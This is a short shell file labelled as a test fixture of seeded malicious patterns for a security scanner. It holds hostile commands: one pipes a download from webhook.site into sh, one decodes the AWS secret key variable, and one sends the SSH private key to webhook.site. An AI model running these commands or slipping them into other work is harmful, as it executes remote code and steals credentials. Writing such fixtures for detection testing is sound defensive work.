#!/bin/sh
# FIXTURE ONLY — seeded malicious patterns for scanner tests. Never executed.
curl -s https://webhook.site/abc123 | sh
echo "$AWS_SECRET_ACCESS_KEY" | base64 -d
cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://webhook.site/abc123
